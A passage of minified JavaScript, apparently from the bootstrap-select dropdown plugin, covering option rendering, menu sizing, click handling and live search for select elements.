                    D.noScroll = !1
                }),
                P(window).off("resize" + j + "." + this.selectId + ".createView").on("resize" + j + "." + this.selectId + ".createView", function() {
                    D.$newElement.hasClass(V.SHOW) && l(D.$menuInner[0].scrollTop)
                })
            },
            focusItem: function(e, t, i) {
                if (e) {
                    t = t || this.selectpicker.main.data[this.activeIndex];
                    var s = e.firstChild;
                    s && (s.setAttribute("aria-setsize", this.selectpicker.view.size),
                    s.setAttribute("aria-posinset", t.posinset),
                    !0 !== i && (this.focusedParent.setAttribute("aria-activedescendant", s.id),
                    e.classList.add("active"),
                    s.classList.add("active")))
                }
            },
            defocusItem: function(e) {
                e && (e.classList.remove("active"),
                e.firstChild && e.firstChild.classList.remove("active"))
            },
            setPlaceholder: function() {
                var e = this
                  , t = !1;
                if (this.options.title && !this.multiple) {
                    this.selectpicker.view.titleOption || (this.selectpicker.view.titleOption = document.createElement("option")),
                    t = !0;
                    var i = this.$element[0]
                      , s = !1
                      , n = !this.selectpicker.view.titleOption.parentNode
                      , o = i.selectedIndex
                      , r = i.options[o]
                      , l = window.performance && window.performance.getEntriesByType("navigation")
                      , a = l && l.length ? "back_forward" !== l[0].type : 2 !== window.performance.navigation.type;
                    n && (this.selectpicker.view.titleOption.className = "bs-title-option",
                    this.selectpicker.view.titleOption.value = "",
                    s = !r || 0 === o && !1 === r.defaultSelected && void 0 === this.$element.data("selected")),
                    !n && 0 === this.selectpicker.view.titleOption.index || i.insertBefore(this.selectpicker.view.titleOption, i.firstChild),
                    s && a ? i.selectedIndex = 0 : "complete" !== document.readyState && window.addEventListener("pageshow", function() {
                        e.selectpicker.view.displayedValue !== i.value && e.render()
                    })
                }
                return t
            },
            buildData: function() {
                var p = ':not([hidden]):not([data-hidden="true"])'
                  , u = []
                  , f = 0
                  , m = this.setPlaceholder() ? 1 : 0;
                this.options.hideDisabled && (p += ":not(:disabled)");
                var e = this.$element[0].querySelectorAll("select > *" + p);
                function v(e) {
                    var t = u[u.length - 1];
                    t && "divider" === t.type && (t.optID || e.optID) || ((e = e || {}).type = "divider",
                    u.push(e))
                }
                function g(e, t) {
                    if ((t = t || {}).divider = "true" === e.getAttribute("data-divider"),
                    t.divider)
                        v({
                            optID: t.optID
                        });
                    else {
                        var i = u.length
                          , s = e.style.cssText
                          , n = s ? S(s) : ""
                          , o = (e.className || "") + (t.optgroupClass || "");
                        t.optID && (o = "opt " + o),
                        t.optionClass = o.trim(),
                        t.inlineStyle = n,
                        t.text = e.textContent,
                        t.content = e.getAttribute("data-content"),
                        t.tokens = e.getAttribute("data-tokens"),
                        t.subtext = e.getAttribute("data-subtext"),
                        t.icon = e.getAttribute("data-icon"),
                        e.liIndex = i,
                        t.display = t.content || t.text,
                        t.type = "option",
                        t.index = i,
                        t.option = e,
                        t.selected = !!e.selected,
                        t.disabled = t.disabled || !!e.disabled,
                        u.push(t)
                    }
                }
                function t(e, t) {
                    var i = t[e]
                      , s = !(e - 1 < m) && t[e - 1]
                      , n = t[e + 1]
                      , o = i.querySelectorAll("option" + p);
                    if (o.length) {
                        var r, l, a = {
                            display: S(i.label),
                            subtext: i.getAttribute("data-subtext"),
                            icon: i.getAttribute("data-icon"),
                            type: "optgroup-label",
                            optgroupClass: " " + (i.className || "")
                        };
                        f++,
                        s && v({
                            optID: f
                        }),
                        a.optID = f,
                        u.push(a);
                        for (var c = 0, d = o.length; c < d; c++) {
                            var h = o[c];
                            0 === c && (l = (r = u.length - 1) + d),
                            g(h, {
                                headerIndex: r,
                                lastIndex: l,
                                optID: a.optID,
                                optgroupClass: a.optgroupClass,
                                disabled: i.disabled
                            })
                        }
                        n && v({
                            optID: f
                        })
                    }
                }
                for (var i = e.length, s = m; s < i; s++) {
                    var n = e[s];
                    "OPTGROUP" !== n.tagName ? g(n, {}) : t(s, e)
                }
                this.selectpicker.main.data = this.selectpicker.current.data = u
            },
            buildList: function() {
                var s = this
                  , e = this.selectpicker.main.data
                  , n = []
                  , o = 0;
                function t(e) {
                    var t, i = 0;
                    switch (e.type) {
                    case "divider":
                        t = K.li(!1, V.DIVIDER, e.optID ? e.optID + "div" : void 0);
                        break;
                    case "option":
                        (t = K.li(K.a(K.text.call(s, e), e.optionClass, e.inlineStyle), "", e.optID)).firstChild && (t.firstChild.id = s.selectId + "-" + e.index);
                        break;
                    case "optgroup-label":
                        t = K.li(K.label.call(s, e), "dropdown-header" + e.optgroupClass, e.optID)
                    }
                    e.element = t,
                    n.push(t),
                    e.display && (i += e.display.length),
                    e.subtext && (i += e.subtext.length),
                    e.icon && (i += 1),
                    o < i && (o = i,
                    s.selectpicker.view.widestOption = n[n.length - 1])
                }
                !s.options.showTick && !s.multiple || _.checkMark.parentNode || (_.checkMark.className = this.options.iconBase + " " + s.options.tickIcon + " check-mark",
                _.a.appendChild(_.checkMark));
                for (var i = e.length, r = 0; r < i; r++) {
                    t(e[r])
                }
                this.selectpicker.main.elements = this.selectpicker.current.elements = n
            },
            findLis: function() {
                return this.$menuInner.find(".inner > li")
            },
            render: function() {
                var e, t = this, i = this.$element[0], s = this.setPlaceholder() && 0 === i.selectedIndex, n = O(i, this.options.hideDisabled), o = n.length, r = this.$button[0], l = r.querySelector(".filter-option-inner-inner"), a = document.createTextNode(this.options.multipleSeparator), c = _.fragment.cloneNode(!1), d = !1;
                if (r.classList.toggle("bs-placeholder", t.multiple ? !o : !z(i, n)),
                t.multiple || 1 !== n.length || (t.selectpicker.view.displayedValue = z(i, n)),
                "static" === this.options.selectedTextFormat)
                    c = K.text.call(this, {
                        text: this.options.title
                    }, !0);
                else if (!1 === (this.multiple && -1 !== this.options.selectedTextFormat.indexOf("count") && 1 < o && (1 < (e = this.options.selectedTextFormat.split(">")).length && o > e[1] || 1 === e.length && 2 <= o))) {
                    if (!s) {
                        for (var h = 0; h < o && h < 50; h++) {
                            var p = n[h]
                              , u = this.selectpicker.main.data[p.liIndex]
                              , f = {};
                            this.multiple && 0 < h && c.appendChild(a.cloneNode(!1)),
                            p.title ? f.text = p.title : u && (u.content && t.options.showContent ? (f.content = u.content.toString(),
                            d = !0) : (t.options.showIcon && (f.icon = u.icon),
                            t.options.showSubtext && !t.multiple && u.subtext && (f.subtext = " " + u.subtext),
                            f.text = p.textContent.trim())),
                            c.appendChild(K.text.call(this, f, !0))
                        }
                        49 < o && c.appendChild(document.createTextNode("..."))
                    }
                } else {
                    var m = ':not([hidden]):not([data-hidden="true"]):not([data-divider="true"])';
                    this.options.hideDisabled && (m += ":not(:disabled)");
                    var v = this.$element[0].querySelectorAll("select > option" + m + ", optgroup" + m + " option" + m).length
                      , g = "function" == typeof this.options.countSelectedText ? this.options.countSelectedText(o, v) : this.options.countSelectedText;
                    c = K.text.call(this, {
                        text: g.replace("{0}", o.toString()).replace("{1}", v.toString())
                    }, !0)
                }
                if (null == this.options.title && (this.options.title = this.$element.attr("title")),
                c.childNodes.length || (c = K.text.call(this, {
                    text: void 0 !== this.options.title ? this.options.title : this.options.noneSelectedText
                }, !0)),
                r.title = c.textContent.replace(/<[^>]*>?/g, "").trim(),
                this.options.sanitize && d && W([c], t.options.whiteList, t.options.sanitizeFn),
                l.innerHTML = "",
                l.appendChild(c),
                M.major < 4 && this.$newElement[0].classList.contains("bs3-has-addon")) {
                    var b = r.querySelector(".filter-expand")
                      , w = l.cloneNode(!0);
                    w.className = "filter-expand",
                    b ? r.replaceChild(w, b) : r.appendChild(w)
                }
                this.$element.trigger("rendered" + j)
            },
            setStyle: function(e, t) {
                var i, s = this.$button[0], n = this.$newElement[0], o = this.options.style.trim();
                this.$element.attr("class") && this.$newElement.addClass(this.$element.attr("class").replace(/selectpicker|mobile-device|bs-select-hidden|validate\[.*\]/gi, "")),
                M.major < 4 && (n.classList.add("bs3"),
                n.parentNode.classList && n.parentNode.classList.contains("input-group") && (n.previousElementSibling || n.nextElementSibling) && (n.previousElementSibling || n.nextElementSibling).classList.contains("input-group-addon") && n.classList.add("bs3-has-addon")),
                i = e ? e.trim() : o,
                "add" == t ? i && s.classList.add.apply(s.classList, i.split(" ")) : "remove" == t ? i && s.classList.remove.apply(s.classList, i.split(" ")) : (o && s.classList.remove.apply(s.classList, o.split(" ")),
                i && s.classList.add.apply(s.classList, i.split(" ")))
            },
            liHeight: function(e) {
                if (e || !1 !== this.options.size && !Object.keys(this.sizeInfo).length) {
                    var t, i = _.div.cloneNode(!1), s = _.div.cloneNode(!1), n = _.div.cloneNode(!1), o = document.createElement("ul"), r = _.li.cloneNode(!1), l = _.li.cloneNode(!1), a = _.a.cloneNode(!1), c = _.span.cloneNode(!1), d = this.options.header && 0 < this.$menu.find("." + V.POPOVERHEADER).length ? this.$menu.find("." + V.POPOVERHEADER)[0].cloneNode(!0) : null, h = this.options.liveSearch ? _.div.cloneNode(!1) : null, p = this.options.actionsBox && this.multiple && 0 < this.$menu.find(".bs-actionsbox").length ? this.$menu.find(".bs-actionsbox")[0].cloneNode(!0) : null, u = this.options.doneButton && this.multiple && 0 < this.$menu.find(".bs-donebutton").length ? this.$menu.find(".bs-donebutton")[0].cloneNode(!0) : null, f = this.$element.find("option")[0];
                    if (this.sizeInfo.selectWidth = this.$newElement[0].offsetWidth,
                    c.className = "text",
                    a.className = "dropdown-item " + (f ? f.className : ""),
                    i.className = this.$menu[0].parentNode.className + " " + V.SHOW,
                    i.style.width = 0,
                    "auto" === this.options.width && (s.style.minWidth = 0),
                    s.className = V.MENU + " " + V.SHOW,
                    n.className = "inner " + V.SHOW,
                    o.className = V.MENU + " inner " + ("4" === M.major ? V.SHOW : ""),
                    r.className = V.DIVIDER,
                    l.className = "dropdown-header",
                    c.appendChild(document.createTextNode("\u200b")),
                    this.selectpicker.current.data.length)
                        for (var m = 0; m < this.selectpicker.current.data.length; m++) {
                            var v = this.selectpicker.current.data[m];
                            if ("option" === v.type) {
                                t = v.element;
                                break
                            }
                        }
                    else
                        t = _.li.cloneNode(!1),
                        a.appendChild(c),
                        t.appendChild(a);
                    if (l.appendChild(c.cloneNode(!0)),
                    this.selectpicker.view.widestOption && o.appendChild(this.selectpicker.view.widestOption.cloneNode(!0)),
                    o.appendChild(t),
                    o.appendChild(r),
                    o.appendChild(l),
                    d && s.appendChild(d),
                    h) {
                        var g = document.createElement("input");
                        h.className = "bs-searchbox",
                        g.className = "form-control",
                        h.appendChild(g),
                        s.appendChild(h)
                    }
                    p && s.appendChild(p),
                    n.appendChild(o),
                    s.appendChild(n),
                    u && s.appendChild(u),
                    i.appendChild(s),
                    document.body.appendChild(i);
                    var b, w = t.offsetHeight, I = l ? l.offsetHeight : 0, x = d ? d.offsetHeight : 0, k = h ? h.offsetHeight : 0, y = p ? p.offsetHeight : 0, $ = u ? u.offsetHeight : 0, S = P(r).outerHeight(!0), E = !!window.getComputedStyle && window.getComputedStyle(s), C = s.offsetWidth, O = E ? null : P(s), z = {
                        vert: N(E ? E.paddingTop : O.css("paddingTop")) + N(E ? E.paddingBottom : O.css("paddingBottom")) + N(E ? E.borderTopWidth : O.css("borderTopWidth")) + N(E ? E.borderBottomWidth : O.css("borderBottomWidth")),
                        horiz: N(E ? E.paddingLeft : O.css("paddingLeft")) + N(E ? E.paddingRight : O.css("paddingRight")) + N(E ? E.borderLeftWidth : O.css("borderLeftWidth")) + N(E ? E.borderRightWidth : O.css("borderRightWidth"))
                    }, T = {
                        vert: z.vert + N(E ? E.marginTop : O.css("marginTop")) + N(E ? E.marginBottom : O.css("marginBottom")) + 2,
                        horiz: z.horiz + N(E ? E.marginLeft : O.css("marginLeft")) + N(E ? E.marginRight : O.css("marginRight")) + 2
                    };
                    n.style.overflowY = "scroll",
                    b = s.offsetWidth - C,
                    document.body.removeChild(i),
                    this.sizeInfo.liHeight = w,
                    this.sizeInfo.dropdownHeaderHeight = I,
                    this.sizeInfo.headerHeight = x,
                    this.sizeInfo.searchHeight = k,
                    this.sizeInfo.actionsHeight = y,
                    this.sizeInfo.doneButtonHeight = $,
                    this.sizeInfo.dividerHeight = S,
                    this.sizeInfo.menuPadding = z,
                    this.sizeInfo.menuExtras = T,
                    this.sizeInfo.menuWidth = C,
                    this.sizeInfo.menuInnerInnerWidth = C - z.horiz,
                    this.sizeInfo.totalMenuWidth = this.sizeInfo.menuWidth,
                    this.sizeInfo.scrollBarWidth = b,
                    this.sizeInfo.selectHeight = this.$newElement[0].offsetHeight,
                    this.setPositionData()
                }
            },
            getSelectPosition: function() {
                var e, t = P(window), i = this.$newElement.offset(), s = P(this.options.container);
                this.options.container && s.length && !s.is("body") ? ((e = s.offset()).top += parseInt(s.css("borderTopWidth")),
                e.left += parseInt(s.css("borderLeftWidth"))) : e = {
                    top: 0,
                    left: 0
                };
                var n = this.options.windowPadding;
                this.sizeInfo.selectOffsetTop = i.top - e.top - t.scrollTop(),
                this.sizeInfo.selectOffsetBot = t.height() - this.sizeInfo.selectOffsetTop - this.sizeInfo.selectHeight - e.top - n[2],
                this.sizeInfo.selectOffsetLeft = i.left - e.left - t.scrollLeft(),
                this.sizeInfo.selectOffsetRight = t.width() - this.sizeInfo.selectOffsetLeft - this.sizeInfo.selectWidth - e.left - n[1],
                this.sizeInfo.selectOffsetTop -= n[0],
                this.sizeInfo.selectOffsetLeft -= n[3]
            },
            setMenuSize: function(e) {
                this.getSelectPosition();
                var t, i, s, n, o, r, l, a, c = this.sizeInfo.selectWidth, d = this.sizeInfo.liHeight, h = this.sizeInfo.headerHeight, p = this.sizeInfo.searchHeight, u = this.sizeInfo.actionsHeight, f = this.sizeInfo.doneButtonHeight, m = this.sizeInfo.dividerHeight, v = this.sizeInfo.menuPadding, g = 0;
                if (this.options.dropupAuto && (l = d * this.selectpicker.current.elements.length + v.vert,
                a = this.sizeInfo.selectOffsetTop - this.sizeInfo.selectOffsetBot > this.sizeInfo.menuExtras.vert && l + this.sizeInfo.menuExtras.vert + 50 > this.sizeInfo.selectOffsetBot,
                !0 === this.selectpicker.isSearching && (a = this.selectpicker.dropup),
                this.$newElement.toggleClass(V.DROPUP, a),
                this.selectpicker.dropup = a),
                "auto" === this.options.size)
                    n = 3 < this.selectpicker.current.elements.length ? 3 * this.sizeInfo.liHeight + this.sizeInfo.menuExtras.vert - 2 : 0,
                    i = this.sizeInfo.selectOffsetBot - this.sizeInfo.menuExtras.vert,
                    s = n + h + p + u + f,
                    r = Math.max(n - v.vert, 0),
                    this.$newElement.hasClass(V.DROPUP) && (i = this.sizeInfo.selectOffsetTop - this.sizeInfo.menuExtras.vert),
                    t = (o = i) - h - p - u - f - v.vert;
                else if (this.options.size && "auto" != this.options.size && this.selectpicker.current.elements.length > this.options.size) {
                    for (var b = 0; b < this.options.size; b++)
                        "divider" === this.selectpicker.current.data[b].type && g++;
                    t = (i = d * this.options.size + g * m + v.vert) - v.vert,
                    o = i + h + p + u + f,
                    s = r = ""
                }
                this.$menu.css({
                    "max-height": o + "px",
                    overflow: "hidden",
                    "min-height": s + "px"
                }),
                this.$menuInner.css({
                    "max-height": t + "px",
                    "overflow-y": "auto",
                    "min-height": r + "px"
                }),
                this.sizeInfo.menuInnerHeight = Math.max(t, 1),
                this.selectpicker.current.data.length && this.selectpicker.current.data[this.selectpicker.current.data.length - 1].position > this.sizeInfo.menuInnerHeight && (this.sizeInfo.hasScrollBar = !0,
                this.sizeInfo.totalMenuWidth = this.sizeInfo.menuWidth + this.sizeInfo.scrollBarWidth),
                "auto" === this.options.dropdownAlignRight && this.$menu.toggleClass(V.MENURIGHT, this.sizeInfo.selectOffsetLeft > this.sizeInfo.selectOffsetRight && this.sizeInfo.selectOffsetRight < this.sizeInfo.totalMenuWidth - c),
                this.dropdown && this.dropdown._popper && this.dropdown._popper.update()
            },
            setSize: function(e) {
                if (this.liHeight(e),
                this.options.header && this.$menu.css("padding-top", 0),
                !1 !== this.options.size) {
                    var t = this
                      , i = P(window);
                    this.setMenuSize(),
                    this.options.liveSearch && this.$searchbox.off("input.setMenuSize propertychange.setMenuSize").on("input.setMenuSize propertychange.setMenuSize", function() {
                        return t.setMenuSize()
                    }),
                    "auto" === this.options.size ? i.off("resize" + j + "." + this.selectId + ".setMenuSize scroll" + j + "." + this.selectId + ".setMenuSize").on("resize" + j + "." + this.selectId + ".setMenuSize scroll" + j + "." + this.selectId + ".setMenuSize", function() {
                        return t.setMenuSize()
                    }) : this.options.size && "auto" != this.options.size && this.selectpicker.current.elements.length > this.options.size && i.off("resize" + j + "." + this.selectId + ".setMenuSize scroll" + j + "." + this.selectId + ".setMenuSize")
                }
                this.createView(!1, !0, e)
            },
            setWidth: function() {
                var i = this;
                "auto" === this.options.width ? requestAnimationFrame(function() {
                    i.$menu.css("min-width", "0"),
                    i.$element.on("loaded" + j, function() {
                        i.liHeight(),
                        i.setMenuSize();
                        var e = i.$newElement.clone().appendTo("body")
                          , t = e.css("width", "auto").children("button").outerWidth();
                        e.remove(),
                        i.sizeInfo.selectWidth = Math.max(i.sizeInfo.totalMenuWidth, t),
                        i.$newElement.css("width", i.sizeInfo.selectWidth + "px")
                    })
                }) : "fit" === this.options.width ? (this.$menu.css("min-width", ""),
                this.$newElement.css("width", "").addClass("fit-width")) : this.options.width ? (this.$menu.css("min-width", ""),
                this.$newElement.css("width", this.options.width)) : (this.$menu.css("min-width", ""),
                this.$newElement.css("width", "")),
                this.$newElement.hasClass("fit-width") && "fit" !== this.options.width && this.$newElement[0].classList.remove("fit-width")
            },
            selectPosition: function() {
                this.$bsContainer = P('<div class="bs-container" />');
                function e(e) {
                    var t = {}
                      , i = r.options.display || !!P.fn.dropdown.Constructor.Default && P.fn.dropdown.Constructor.Default.display;
                    r.$bsContainer.addClass(e.attr("class").replace(/form-control|fit-width/gi, "")).toggleClass(V.DROPUP, e.hasClass(V.DROPUP)),
                    s = e.offset(),
                    l.is("body") ? n = {
                        top: 0,
                        left: 0
                    } : ((n = l.offset()).top += parseInt(l.css("borderTopWidth")) - l.scrollTop(),
                    n.left += parseInt(l.css("borderLeftWidth")) - l.scrollLeft()),
                    o = e.hasClass(V.DROPUP) ? 0 : e[0].offsetHeight,
                    (M.major < 4 || "static" === i) && (t.top = s.top - n.top + o,
                    t.left = s.left - n.left),
                    t.width = e[0].offsetWidth,
                    r.$bsContainer.css(t)
                }
                var s, n, o, r = this, l = P(this.options.container);
                this.$button.on("click.bs.dropdown.data-api", function() {
                    r.isDisabled() || (e(r.$newElement),
                    r.$bsContainer.appendTo(r.options.container).toggleClass(V.SHOW, !r.$button.hasClass(V.SHOW)).append(r.$menu))
                }),
                P(window).off("resize" + j + "." + this.selectId + " scroll" + j + "." + this.selectId).on("resize" + j + "." + this.selectId + " scroll" + j + "." + this.selectId, function() {
                    r.$newElement.hasClass(V.SHOW) && e(r.$newElement)
                }),
                this.$element.on("hide" + j, function() {
                    r.$menu.data("height", r.$menu.height()),
                    r.$bsContainer.detach()
                })
            },
            setOptionStatus: function(e) {
                var t = this;
                if (t.noScroll = !1,
                t.selectpicker.view.visibleElements && t.selectpicker.view.visibleElements.length)
                    for (var i = 0; i < t.selectpicker.view.visibleElements.length; i++) {
                        var s = t.selectpicker.current.data[i + t.selectpicker.view.position0]
                          , n = s.option;
                        n && (!0 !== e && t.setDisabled(s.index, s.disabled),
                        t.setSelected(s.index, n.selected))
                    }
            },
            setSelected: function(e, t) {
                var i, s, n = this.selectpicker.main.elements[e], o = this.selectpicker.main.data[e], r = void 0 !== this.activeIndex, l = this.activeIndex === e || t && !this.multiple && !r;
                o.selected = t,
                s = n.firstChild,
                t && (this.selectedIndex = e),
                n.classList.toggle("selected", t),
                l ? (this.focusItem(n, o),
                this.selectpicker.view.currentActive = n,
                this.activeIndex = e) : this.defocusItem(n),
                s && (s.classList.toggle("selected", t),
                t ? s.setAttribute("aria-selected", !0) : this.multiple ? s.setAttribute("aria-selected", !1) : s.removeAttribute("aria-selected")),
                l || r || !t || void 0 === this.prevActiveIndex || (i = this.selectpicker.main.elements[this.prevActiveIndex],
                this.defocusItem(i))
            },
            setDisabled: function(e, t) {
                var i, s = this.selectpicker.main.elements[e];
                this.selectpicker.main.data[e].disabled = t,
                i = s.firstChild,
                s.classList.toggle(V.DISABLED, t),
                i && ("4" === M.major && i.classList.toggle(V.DISABLED, t),
                t ? (i.setAttribute("aria-disabled", t),
                i.setAttribute("tabindex", -1)) : (i.removeAttribute("aria-disabled"),
                i.setAttribute("tabindex", 0)))
            },
            isDisabled: function() {
                return this.$element[0].disabled
            },
            checkDisabled: function() {
                this.isDisabled() ? (this.$newElement[0].classList.add(V.DISABLED),
                this.$button.addClass(V.DISABLED).attr("aria-disabled", !0)) : this.$button[0].classList.contains(V.DISABLED) && (this.$newElement[0].classList.remove(V.DISABLED),
                this.$button.removeClass(V.DISABLED).attr("aria-disabled", !1))
            },
            clickListener: function() {
                var C = this
                  , t = P(document);
                function e() {
                    C.options.liveSearch ? C.$searchbox.trigger("focus") : C.$menuInner.trigger("focus")
                }
                function i() {
                    C.dropdown && C.dropdown._popper && C.dropdown._popper.state.isCreated ? e() : requestAnimationFrame(i)
                }
                t.data("spaceSelect", !1),
                this.$button.on("keyup", function(e) {
                    /(32)/.test(e.keyCode.toString(10)) && t.data("spaceSelect") && (e.preventDefault(),
                    t.data("spaceSelect", !1))
                }),
                this.$newElement.on("show.bs.dropdown", function() {
                    3 < M.major && !C.dropdown && (C.dropdown = C.$button.data("bs.dropdown"),
                    C.dropdown._menu = C.$menu[0])
                }),
                this.$button.on("click.bs.dropdown.data-api", function() {
                    C.$newElement.hasClass(V.SHOW) || C.setSize()
                }),
                this.$element.on("shown" + j, function() {
                    C.$menuInner[0].scrollTop !== C.selectpicker.view.scrollTop && (C.$menuInner[0].scrollTop = C.selectpicker.view.scrollTop),
                    3 < M.major ? requestAnimationFrame(i) : e()
                }),
                this.$menuInner.on("mouseenter", "li a", function(e) {
                    var t = this.parentElement
                      , i = C.isVirtual() ? C.selectpicker.view.position0 : 0
                      , s = Array.prototype.indexOf.call(t.parentElement.children, t)
                      , n = C.selectpicker.current.data[s + i];
                    C.focusItem(t, n, !0)
                }),
                this.$menuInner.on("click", "li a", function(e, t) {
                    var i = P(this)
                      , s = C.$element[0]
                      , n = C.isVirtual() ? C.selectpicker.view.position0 : 0
                      , o = C.selectpicker.current.data[i.parent().index() + n]
                      , r = o.index
                      , l = z(s)
                      , a = s.selectedIndex
                      , c = s.options[a]
                      , d = !0;
                    if (C.multiple && 1 !== C.options.maxOptions && e.stopPropagation(),
                    e.preventDefault(),
                    !C.isDisabled() && !i.parent().hasClass(V.DISABLED)) {
                        var h = o.option
                          , p = P(h)
                          , u = h.selected
                          , f = p.parent("optgroup")
                          , m = f.find("option")
                          , v = C.options.maxOptions
                          , g = f.data("maxOptions") || !1;
                        if (r === C.activeIndex && (t = !0),
                        t || (C.prevActiveIndex = C.activeIndex,
                        C.activeIndex = void 0),
                        C.multiple) {
                            if (h.selected = !u,
                            C.setSelected(r, !u),
                            C.focusedParent.focus(),
                            !1 !== v || !1 !== g) {
                                var b = v < O(s).length
                                  , w = g < f.find("option:selected").length;
                                if (v && b || g && w)
                                    if (v && 1 == v)
                                        s.selectedIndex = -1,
                                        h.selected = !0,
                                        C.setOptionStatus(!0);
                                    else if (g && 1 == g) {
                                        for (var I = 0; I < m.length; I++) {
                                            var x = m[I];
                                            x.selected = !1,
                                            C.setSelected(x.liIndex, !1)
                                        }
                                        h.selected = !0,
                                        C.setSelected(r, !0)
                                    } else {
                                        var k = "string" == typeof C.options.maxOptionsText ? [C.options.maxOptionsText, C.options.maxOptionsText] : C.options.maxOptionsText
                                          , y = "function" == typeof k ? k(v, g) : k
                                          , $ = y[0].replace("{n}", v)
                                          , S = y[1].replace("{n}", g)
                                          , E = P('<div class="notify"></div>');
                                        y[2] && ($ = $.replace("{var}", y[2][1 < v ? 0 : 1]),
                                        S = S.replace("{var}", y[2][1 < g ? 0 : 1])),
                                        h.selected = !1,
                                        C.$menu.append(E),
                                        v && b && (E.append(P("<div>" + $ + "</div>")),
                                        d = !1,
                                        C.$element.trigger("maxReached" + j)),
                                        g && w && (E.append(P("<div>" + S + "</div>")),
                                        d = !1,
                                        C.$element.trigger("maxReachedGrp" + j)),
                                        setTimeout(function() {
                                            C.setSelected(r, !1)
                                        }, 10),
                                        E[0].classList.add("fadeOut"),
                                        setTimeout(function() {
                                            E.remove()
                                        }, 1050)
                                    }
                            }
                        } else
                            c && (c.selected = !1),
                            h.selected = !0,
                            C.setSelected(r, !0);
                        !C.multiple || C.multiple && 1 === C.options.maxOptions ? C.$button.trigger("focus") : C.options.liveSearch && C.$searchbox.trigger("focus"),
                        d && (!C.multiple && a === s.selectedIndex || (T = [h.index, p.prop("selected"), l],
                        C.$element.triggerNative("change")))
                    }
                }),
                this.$menu.on("click", "li." + V.DISABLED + " a, ." + V.POPOVERHEADER + ", ." + V.POPOVERHEADER + " :not(.close)", function(e) {
                    e.currentTarget == this && (e.preventDefault(),
                    e.stopPropagation(),
                    C.options.liveSearch && !P(e.target).hasClass("close") ? C.$searchbox.trigger("focus") : C.$button.trigger("focus"))
                }),
                this.$menuInner.on("click", ".divider, .dropdown-header", function(e) {
                    e.preventDefault(),
                    e.stopPropagation(),
                    C.options.liveSearch ? C.$searchbox.trigger("focus") : C.$button.trigger("focus")
                }),
                this.$menu.on("click", "." + V.POPOVERHEADER + " .close", function() {
                    C.$button.trigger("click")
                }),
                this.$searchbox.on("click", function(e) {
                    e.stopPropagation()
                }),
                this.$menu.on("click", ".actions-btn", function(e) {
                    C.options.liveSearch ? C.$searchbox.trigger("focus") : C.$button.trigger("focus"),
                    e.preventDefault(),
                    e.stopPropagation(),
                    P(this).hasClass("bs-select-all") ? C.selectAll() : C.deselectAll()
                }),
                this.$button.on("focus" + j, function(e) {
                    var t = C.$element[0].getAttribute("tabindex");
                    void 0 !== t && e.originalEvent && e.originalEvent.isTrusted && (this.setAttribute("tabindex", t),
                    C.$element[0].setAttribute("tabindex", -1),
                    C.selectpicker.view.tabindex = t)
                }).on("blur" + j, function(e) {
                    void 0 !== C.selectpicker.view.tabindex && e.originalEvent && e.originalEvent.isTrusted && (C.$element[0].setAttribute("tabindex", C.selectpicker.view.tabindex),
                    this.setAttribute("tabindex", -1),
                    C.selectpicker.view.tabindex = void 0)
                }),
                this.$element.on("change" + j, function() {
                    C.render(),
                    C.$element.trigger("changed" + j, T),
                    T = null
                }).on("focus" + j, function() {
                    C.options.mobile || C.$button[0].focus()
                })
            },
            liveSearchListener: function() {
                var u = this;
                this.$button.on("click.bs.dropdown.data-api", function() {
                    u.$searchbox.val() && (u.$searchbox.val(""),
                    u.selectpicker.search.previousValue = void 0)
                }),
                this.$searchbox.on("click.bs.dropdown.data-api focus.bs.dropdown.data-api touchend.bs.dropdown.data-api", function(e) {
                    e.stopPropagation()
                }),
                this.$searchbox.on("input propertychange", function() {
                    var e = u.$searchbox[0].value;
                    if (u.selectpicker.search.elements = [],
                    u.selectpicker.search.data = [],
                    e) {
                        var t = []
                          , i = e.toUpperCase()
                          , s = {}
                          , n = []
                          , o = u._searchStyle()
                          , r = u.options.liveSearchNormalize;
                        r && (i = w(i));
                        for (var l = 0; l < u.selectpicker.main.data.length; l++) {
                            var a = u.selectpicker.main.data[l];
                            s[l] || (s[l] = k(a, i, o, r)),
                            s[l] && void 0 !== a.headerIndex && -1 === n.indexOf(a.headerIndex) && (0 < a.headerIndex && (s[a.headerIndex - 1] = !0,
                            n.push(a.headerIndex - 1)),
                            s[a.headerIndex] = !0,
                            n.push(a.headerIndex),
                            s[a.lastIndex + 1] = !0),
                            s[l] && "optgroup-label" !== a.type && n.push(l)
                        }
                        l = 0;
                        for (var c = n.length; l < c; l++) {
                            var d = n[l]
                              , h = n[l - 1]
                              , p = (a = u.selectpicker.main.data[d],
                            u.selectpicker.main.data[h]);
                            ("divider" !== a.type || "divider" === a.type && p && "divider" !== p.type && c - 1 !== l) && (u.selectpicker.search.data.push(a),
                            t.push(u.selectpicker.main.elements[d]))
                        }
                        u.activeIndex = void 0,
                        u.noScroll = !0,
                        u.$menuInner.scrollTop(0),
                        u.selectpicker.search.elements = t,
                        u.createView(!0),
                        function(e, t) {
                            e.length || (_.noResults.innerHTML = this.options.noneResultsText.replace("{0}", '"' + S(t) + '"'),
                            this.$menuInner[0].firstChild.appendChild(_.noResults))
                        }
                        .call(u, t, e)
                    } else
                        u.selectpicker.search.previousValue && (u.$menuInner.scrollTop(0),
                        u.createView(!1));
                    u.selectpicker.search.previousValue = e
                })
            },
            _searchStyle: function() {
                return this.options.liveSearchStyle || "contains"
            },
            val: function(e) {
                var t = this.$element[0];
                if (void 0 === e)
                    return this.$element.val();
                var i = z(t);
                if (T = [null, null, i],
                this.$element.val(e).trigger("changed" + j, T),
                this.$newElement.hasClass(V.SHOW))
                    if (this.multiple)
                        this.setOptionStatus(!0);
                    else {
                        var s = (t.options[t.selectedIndex] || {}).liIndex;
                        "number" == typeof s && (this.setSelected(this.selectedIndex, !1),
                        this.setSelected(s, !0))
                    }
                return this.render(),
                T = null,
                this.$element
            },
            changeAll: function(e) {
                if (this.multiple) {
                    void 0 === e && (e = !0);
                    var t = this.$element[0]
                      , i = 0
                      , s = 0
                      , n = z(t);
                    t.classList.add("bs-select-hidden");
                    for (var o = 0, r = this.selectpicker.current.data, l = r.length; o < l; o++) {
                        var a = r[o]
                          , c = a.option;
                        c && !a.disabled && "divider" !== a.type && (a.selected && i++,
                        !0 === (c.selected = e) && s++)
                    }
                    t.classList.remove("bs-select-hidden"),
                    i !== s && (this.setOptionStatus(),
                    T = [null, null, n],
                    this.$element.triggerNative("change"))
                }
            },
            selectAll: function() {
                return this.changeAll(!0)
            },
            deselectAll: function() {
                return this.changeAll(!1)
            },
            toggle: function(e) {
                (e = e || window.event) && e.stopPropagation(),
